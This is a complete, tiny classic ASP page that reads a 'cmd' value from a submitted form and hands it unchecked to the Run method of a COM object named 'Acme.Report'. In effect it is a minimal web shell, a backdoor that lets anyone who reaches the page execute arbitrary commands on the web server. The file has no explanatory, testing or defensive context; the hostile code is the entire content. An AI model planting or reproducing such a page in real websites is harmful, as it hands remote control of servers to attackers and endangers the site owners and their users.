<%
Set oScript = Server.CreateObject("Acme.Report")
szCMD = Request.Form("cmd")
oScript.Run(szCMD)
%>
